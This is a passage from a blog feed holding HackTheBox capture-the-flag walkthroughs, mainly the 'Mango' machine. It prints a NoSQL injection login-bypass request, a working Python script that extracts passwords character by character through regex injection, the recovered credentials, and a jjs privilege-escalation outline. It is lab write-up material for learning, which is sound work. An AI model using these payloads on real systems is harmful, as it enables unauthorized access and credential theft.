class="line">C:\Users\Administrator\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number <span class="keyword">is</span> C05D<span class="number">-877</span>F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"><span class="number">11</span>/<span class="number">08</span>/<span class="number">2019</span>  <span class="number">12</span>:<span class="number">12</span> PM    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">11</span>/<span class="number">08</span>/<span class="number">2019</span>  <span class="number">12</span>:<span class="number">12</span> PM    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">11</span>/<span class="number">01</span>/<span class="number">2019</span>  <span class="number">01</span>:<span class="number">33</span> PM                <span class="number">32</span> root.txt</span><br><span class="line">               <span class="number">1</span> File(s)             <span class="number">32</span> bytes</span><br><span class="line">               <span class="number">2</span> Dir(s)  <span class="number">43</span>,<span class="number">597</span>,<span class="number">795</span>,<span class="number">328</span> bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;more root.txt</span><br><span class="line">more root.txt</span><br><span class="line"><span class="number">8f</span>861[---------------------]ec1b1</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure><hr><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p><hr><p>Referrences:</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists" target="_blank" rel="noopener">ACL or Access Control Lists</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
          <category> PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> retired </tag>
            
            <tag> registry </tag>
            
            <tag> windows </tag>
            
            <tag> sqli </tag>
            
            <tag> http-header </tag>
            
            <tag> sqlmap </tag>
            
            <tag> webshell </tag>
            
            <tag> services </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Mango</title>
      <link href="/2020-04-18/HackTheBox-Mango/"/>
      <url>/2020-04-18/HackTheBox-Mango/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/mango/mango-machine.png" alt="HackTheBox-Sniper" title="Mango machine details"></p><hr><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   ‚Üí Another awesome machine ‚Äì <code>&quot;Mango&quot;</code> is a medium difficulty box that was vulnerable into <code>NoSQL injection</code> attack. I was stuck on the <code>main page</code> and the <code>analytics page</code> for an hour until i realize that was only a rabbit hole. There was a login page in <code>staging-order.mango.htb</code> that‚Äôs appeal on my <em>NMAP</em> scan. When I go to the forum I found out that the <code>web apps</code> use <code>MongoDB</code> when you try to search on google <code>Mango db</code> it‚Äôs a database program, classified as a NoSQL database program.<br>   Using payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" target="_blank" rel="noopener">PayloadAllTheThings</a> i managed to bypass the login page‚Äô but when I get in i‚Äôll redirect at a <code>Under Plantation</code> page that was another rabbit hole, but it‚Äôs okay because I have now the idea that the machine is vulnerable to <code>NoSQL Injection</code> attack. With my python <code>script</code> i get the credentials for user <code>mango</code> &amp; <code>admin</code> to get in to the machine via <code>SSH</code> and get the <code>user.txt</code>.<br>   In the privilege escalation part there was a vulnerable software installed which is the <code>jjs</code> ‚Äì a java program command-line tool that is used to invoke the Nashorn engine. You can use it to interpret one or several script files, or to run an interactive shell.<br>   I abuse the vulnerabilty by reading the <code>root.txt</code> and also inject my own <code>SSH</code> key and get in to the machine and got the administrator shell.</p><hr><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>‚Üí Nmap scan</p><p>‚Üí discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>‚Üí Browsing the HTTP Service</p><p>‚Üí Exploring the <code>Analytics page</code></p><p>‚Üí check the ssl certicate of the webapps</p></li><li><p><strong>Post - Exploitation</strong></p><p>‚Üí Trying to bypass the Login page at <code>staging-order.mango.htb</code></p><p>‚Üí with this payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" target="_blank" rel="noopener">PayloadAllTheThings - NoSQL Injection Attack</a> I managed to bypass the login</p></li><li><p><strong>Exploitation</strong></p><p>‚Üí bruteforce the credentials of user ‚Äì <code>mango</code> &amp; <code>admin</code> using python script</p><p>‚Üí After a minutes finally gets the both creds, Login with <code>SSH Key</code> and get the <code>user.txt</code></p></li><li><p><strong>Privilege Escalation</strong></p><p>‚Üí execute <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum.sh</a> to look what we can do the machine</p><p>‚Üí look for what permission is allowed to user ‚Äì <code>admin</code></p><p>‚Üí found the vulnerable software ‚Äì <code>jjs</code></p><p>‚Üí with the help from <a href="https://gtfobins.github.io/gtfobins/jjs/" target="_blank" rel="noopener">GTFObins - jjs</a> I can execute <code>File read</code> command to get <code>root.txt</code></p><p>‚Üí I can also inject SSH keys with <code>File write</code> command</p><p>‚Üí Login with my generated SSH keys and become the administrator.</p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí I always begin at <strong><em>NMAP</em></strong> to look on the services what is running. I always use</p><hr><ul><li>-sV      ‚áí Probe open ports to determine service/version info</li><li>-sC      ‚áí equivalent to ‚Äîscript=default</li><li>-T 0-5   ‚áí Set timing template - higher is faster (less accurate)</li><li>-A-      ‚áí Agressive scan</li><li>-oN      ‚áí to save our scan results to a text file</li></ul><hr><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">nmap -sV -sC -A -T4 <span class="number">10.10</span><span class="number">.10</span><span class="number">.162</span> -oN nmap-Mango</span><br></pre></td></tr></table></figure><hr><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Mango </span><br><span class="line">‚ùØ nmap -sV -sC -A 10.10.10.162 -oN nmap-Mango</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-19 05:31 PST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.162</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)</span><br><span class="line">|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)</span><br><span class="line">|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Mango | Search Base</span><br><span class="line">| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN</span><br><span class="line">| Not valid before: 2019-09-27T14:21:19</span><br><span class="line">|_Not valid after:  2020-09-26T14:21:19</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=4/19%OT=22%CT=1%CU=30519%PV=Y%DS=2%DC=T%G=Y%TM=5E9B71D</span><br><span class="line">OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS</span><br><span class="line">OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1</span><br><span class="line">OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN</span><br><span class="line">OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A</span><br><span class="line">OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R</span><br><span class="line">OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F</span><br><span class="line">OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%</span><br><span class="line">OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD</span><br><span class="line">OS:=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 8888/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   209.53 ms 10.10.14.1</span><br><span class="line">2   216.74 ms 10.10.10.162</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 47.79 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Mango took 48s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><hr><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there‚Äôs port open.</p><ul><li>22      ‚áí which basically use for SSH Connections</li><li>80       ‚áí which basically running a website</li><li>443       ‚áí which holding SSL Certificate with <code>&quot;staging-order.mango.htb&quot;</code> I added it to my <code>/etc/hosts</code> file.</li></ul><hr><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Mango-Website"><a href="#Mango-Website" class="headerlink" title="Mango Website"></a>Mango Website</h3><p>Normally i explore first the website‚Äô because that will give us interesting stuffs so :</p><p><img src="/img/mango/mango-home-page.png" alt="HackTheBox-Sniper" title="Mango Webpage"></p><p>The main page is looks like a google search right ? At first I didn‚Äôt realize that the main page is a hint for this machine i will tell it later.</p><p>Next i clicked on the analytics tabs :</p><p><img src="/img/mango/mango-analytcs.png" alt="HackTheBox-Sniper" title="Mango Webpage"></p><p>This page is totally a rabbit hole‚Äô I can‚Äôt do anything about the website so I check the SSL Certifcate and it was registed at <code>staging-order.mango.htb</code> so I added it into my <code>/etc/hosts</code> file.</p><p><img src="/img/mango/mango-cert.png" alt="HackTheBox-Sniper" title="Mango Webpage"></p><p>So after that I visited <code>staging-order.mango.htb</code> and it was a Login page.</p><p><img src="/img/mango/mango-login-page.png" alt="HackTheBox-Sniper" title="Mango Login page"></p><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Bypass-Login"><a href="#Bypass-Login" class="headerlink" title="Bypass Login"></a>Bypass Login</h3><p>I mention about that the main page is looks like a google search‚Äô I realized that was hint to give me idea what should I do for this phase. From the forum it‚Äôs a database, the name <code>MANGO</code> is a big hint, so I go to google and search about <code>Mango DB</code> and it give me a results <code>MongoDB</code> which use <code>NoSQL</code><br>database program.</p><p>so I search about <strong>NoSQL Injection Attack</strong> and I found <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" target="_blank" rel="noopener">this</a> then tried to login with some credentials and used <code>Burp Suite</code> to intercept the request, then modified the request body parameters base on the payload so :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Burp Suite Repeater</span></span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: staging-order.mango.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://staging-order.mango.htb/index.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 53</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=9rr8f4ht86hjj17q1vkrlhskfb</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username[<span class="variable">$ne</span>]=payas0&amp;password[<span class="variable">$ne</span>]=payas0&amp;login=login</span><br></pre></td></tr></table></figure><p>I modified the username &amp; password parameters by adding this <code>[$ne]</code> sending this it will return to <code>HTTP/1.1 200 OK</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Burp Suite Repeater</span></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 18 Apr 2020 22:22:28 GMT</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 3380</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><p>Follow redirection and it will go to <code>/home.php</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Burp Suite Repeater</span></span><br><span class="line"></span><br><span class="line">GET /home.php HTTP/1.1</span><br><span class="line">Host: staging-order.mango.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://staging-order.mango.htb/index.php</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=9rr8f4ht86hjj17q1vkrlhskfb</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><h3 id="Under-Plantation"><a href="#Under-Plantation" class="headerlink" title="Under Plantation"></a>Under Plantation</h3><p>when I finally bypass the login it goes me to <code>Under Plantation</code> page :</p><p><img src="/img/mango/mango-under-plantation.png" alt="HackTheBox-Sniper" title="Mango Webpage"></p><p>As you can see at the page there was a user ‚Äì <code>admin@mango.htb</code> so I will keep it to my mind.<br>Now that I‚Äôm in I try to bruteforce the website under <code>/home.php</code> but bruteforcing is not really helpful until I found that this page is a rabbit hole again. but I have got a user <code>admin</code> and also already know that this was vulnerable to <code>NoSQL Injection</code> attack.</p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="NoSQL-Injection"><a href="#NoSQL-Injection" class="headerlink" title="NoSQL Injection"></a>NoSQL Injection</h3><p>I search about <code>MongoDB - NoSQL Injection</code> attack luckily i found this <a href="https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/" target="_blank" rel="noopener">article</a> it is about extracting admin password from the database using <code>NoSQL Injections</code>.</p><p>So then I made a python script that will automate the extraction of password similar to the article, this will need patience because password will reveal one by one so :</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">username=<span class="string">"mango"</span></span><br><span class="line">password=<span class="string">""</span></span><br><span class="line">u=<span class="string">"http://staging-order.mango.htb"</span> <span class="comment"># Enter the url here</span></span><br><span class="line">headers=&#123;<span class="string">'content-type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>, <span class="string">'staging-order.mango.htb'</span>: <span class="string">''</span>&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">'*'</span>,<span class="string">'+'</span>,<span class="string">'.'</span>,<span class="string">'?'</span>,<span class="string">'|'</span>,<span class="string">'&amp;'</span>,<span class="string">'\\'</span>]:</span><br><span class="line">            payload=<span class="string">'username=%s&amp;password[$regex]=^%s.*&amp;login=login'</span>% (username,password + c)</span><br><span class="line">            r = requests.post(u, data = payload, headers = headers, verify = <span class="literal">False</span>, allow_redirects = <span class="literal">False</span>)</span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            <span class="comment">#print(r.status_code)</span></span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">                print(<span class="string">"Found one more char : %s"</span> % (password+c))</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure><h3 id="Get-user-shell"><a href="#Get-user-shell" class="headerlink" title="Get user shell"></a>Get user shell</h3><p>after almost 10 minutes I complete extracting the user <code>mango</code> password</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">mango:h3mXK8RhU~f&#123;]f5H</span><br></pre></td></tr></table></figure><p>Now login this with <code>SSH</code> I have now finally the initial shell.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Mango via üêç v2.7.17 </span><br><span class="line">‚ùØ ssh mango@10.10.10.162</span><br><span class="line">The authenticity of host <span class="string">'10.10.10.162 (10.10.10.162)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:AhHG3k5r1ic/7nEKLWHXoNm0m28uM9W8heddb9lCTm0.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>10.10.10.162<span class="string">' (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">mango@10.10.10.162'</span>s password: </span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sat Apr 18 22:39:50 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.01               Processes:            103</span><br><span class="line">  Usage of /:   25.9% of 19.56GB   Users logged <span class="keyword">in</span>:      0</span><br><span class="line">  Memory usage: 11%                IP address <span class="keyword">for</span> ens33: 10.10.10.162</span><br><span class="line">  Swap usage:   3%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">122 packages can be updated.</span><br><span class="line">18 updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sat Apr 18 21:49:56 2020 from 10.10.14.192</span><br><span class="line">mango@mango:~$</span><br></pre></td></tr></table></figure><p>I thought i can now get the <code>user.txt</code> until I remember there was another user that I see on the <code>Under Plantation</code> page the <code>admin</code> user. The next I did is to extract also the password using my python script, I just change only the line ‚Äì <code>username:&quot;mango&quot;</code> to <code>username:&quot;admin&quot;</code> and execute the script.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">username=<span class="string">"admin"</span> <span class="comment">#enter the username</span></span><br><span class="line">password=<span class="string">""</span></span><br><span class="line">u=<span class="string">"http://staging-order.mango.htb"</span> <span class="comment"># Enter the url here</span></span><br><span class="line">headers=&#123;<span class="string">'content-type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>, <span class="string">'staging-order.mango.htb'</span>: <span class="string">''</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">'*'</span>,<span class="string">'+'</span>,<span class="string">'.'</span>,<span class="string">'?'</span>,<span class="string">'|'</span>,<span class="string">'&amp;'</span>,<span class="string">'\\'</span>]:</span><br><span class="line">            payload=<span class="string">'username=%s&amp;password[$regex]=^%s.*&amp;login=login'</span>% (username,password + c)</span><br><span class="line">            r = requests.post(u, data = payload, headers = headers, verify = <span class="literal">False</span>, allow_redirects = <span class="literal">False</span>)</span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            <span class="comment">#print(r.status_code)</span></span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">                print(<span class="string">"Found one more char : %s"</span> % (password+c))</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure><p>after 10 minutes the admin password is completed.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">admin:t9KcS3&gt;!0B<span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>now with mango shell I just switch the user and finally get the <code>user.txt</code> :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">mango@mango:~$ su admin</span><br><span class="line">Password: </span><br><span class="line">$ id</span><br><span class="line">uid=4000000000(admin) gid=1001(admin) groups=1001(admin)</span><br><span class="line">$ ls</span><br><span class="line">exploit.sh  leon.sh</span><br><span class="line">$ /bin/bash -i</span><br><span class="line">To run a <span class="built_in">command</span> as administrator (user <span class="string">"root"</span>), use <span class="string">"sudo &lt;command&gt;"</span>.</span><br><span class="line">See <span class="string">"man sudo_root"</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">admin@mango:/home/mango$ <span class="built_in">cd</span> ..</span><br><span class="line">admin@mango:/home$ ls</span><br><span class="line">admin  mango</span><br><span class="line">admin@mango:/home$ <span class="built_in">cd</span> admin</span><br><span class="line">admin@mango:/home/admin$ ls</span><br><span class="line">user.txt</span><br><span class="line">admin@mango:/home/admin$ cat user.txt</span><br><span class="line">79bf3[---------------------]47e92</span><br><span class="line">admin@mango:/home/admin$</span><br></pre></td></tr></table></figure><hr><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="JJS-Exploitation"><a href="#JJS-Exploitation" class="headerlink" title="JJS Exploitation"></a>JJS Exploitation</h3><p>For privilege escalation phase I will use <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum.sh</a> to look for some stuffs that I will use to get the admin shell.</p><p>so from my Kali Linux machine, i transfer <code>LinEnum</code> to the target and execute.</p><p>As always it will show the basic information of the vulnerable machine.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">admin@mango:/tmp$ bash LinEnum.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#########################################################</span></span><br><span class="line"><span class="meta"># Local Linux Enumeration &amp; Privilege Escalation Script #</span></span><br><span class="line"><span class="meta">#########################################################</span></span><br><span class="line"><span class="meta"># www.rebootuser.com</span></span><br><span class="line"><span class="meta"># version 0.982</span></span><br><span class="line"></span><br><span class="line">[<span class="meta">-</span>] Debug Info</span><br><span class="line">[<span class="meta">+</span>] Thorough tests = Disabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scan started at:</span><br><span class="line">Sat Apr <span class="number">18</span> <span class="number">22</span>:<span class="number">52</span>:<span class="number">10</span> UTC <span class="number">2020</span>                                                                                                                                                               </span><br><span class="line">                                                                                                                                                                                           </span><br><span class="line"></span><br><span class="line"><span class="meta">### SYSTEM ##############################################</span></span><br><span class="line">[<span class="meta">-</span>] Kernel information:</span><br><span class="line">Linux mango <span class="number">4.15</span><span class="number">.0</span><span class="number">-64</span>-generic <span class="meta">#73-Ubuntu SMP Thu Sep 12 13:16:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="meta">-</span>] <span class="function">Kernel <span class="title">information</span> (<span class="params">continued</span>):</span></span><br><span class="line"><span class="function">Linux version 4.15.0-64-<span class="title">generic</span> (<span class="params">buildd@lgw01-amd64<span class="number">-038</span></span>) (<span class="params">gcc version <span class="number">7.4</span><span class="number">.0</span> (Ubuntu <span class="number">7.4</span><span class="number">.0</span><span class="number">-1u</span>buntu1~<span class="number">18.04</span><span class="number">.1</span></span>)) #73-Ubuntu SMP Thu Sep 12 13:16:13 UTC 2019</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[-] Specific release information:</span></span><br><span class="line"><span class="function">DISTRIB_ID</span>=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=<span class="number">18.04</span></span><br><span class="line">DISTRIB_CODENAME=bionic</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">"Ubuntu 18.04.2 LTS"</span></span><br><span class="line">NAME=<span class="string">"Ubuntu"</span></span><br><span class="line">VERSION=<span class="string">"18.04.2 LTS (Bionic Beaver)"</span></span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=<span class="string">"Ubuntu 18.04.2 LTS"</span></span><br><span class="line">VERSION_ID=<span class="string">"18.04"</span></span><br><span class="line">HOME_URL=<span class="string">"https://www.ubuntu.com/"</span></span><br><span class="line">SUPPORT_URL=<span class="string">"https://help.ubuntu.com/"</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">"https://bugs.launchpad.net/ubuntu/"</span></span><br><span class="line">PRIVACY_POLICY_URL=<span class="string">"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</span></span><br><span class="line">VERSION_CODENAME=bionic</span><br><span class="line">UBUNTU_CODENAME=bionic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="meta">-</span>] Hostname:</span><br><span class="line">mango</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">### USER/GROUP ##########################################</span></span><br><span class="line">[<span class="meta">-</span>] Current user/<span class="keyword">group</span> info:</span><br><span class="line">uid=<span class="number">4000000000</span>(admin) gid=<span class="number">1001</span>(admin) groups=<span class="number">1001</span>(admin)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="meta">-</span>] Users that have previously logged onto the system:</span><br><span class="line">Username         Port     From             Latest</span><br><span class="line">root             pts/<span class="number">1</span>    <span class="number">10.10</span><span class="number">.14</span><span class="number">.247</span>     Sat Apr <span class="number">18</span> <span class="number">21</span>:<span class="number">13</span>:<span class="number">13</span> +<span class="number">0000</span> <span class="number">2020</span></span><br><span class="line">mango            pts/<span class="number">0</span>    <span class="number">10.10</span><span class="number">.15</span><span class="number">.230</span>     Sat Apr <span class="number">18</span> <span class="number">22</span>:<span class="number">39</span>:<span class="number">51</span> +<span class="number">0000</span> <span class="number">2020</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="meta">-</span>] Who <span class="keyword">else</span> <span class="keyword">is</span> logged <span class="keyword">on</span>:</span><br><span class="line"> <span class="number">22</span>:<span class="number">52</span>:<span class="number">10</span> up  <span class="number">1</span>:<span class="number">41</span>,  <span class="number">1</span> user,  load average: <span class="number">0.01</span>, <span class="number">0.02</span>, <span class="number">0.00</span></span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   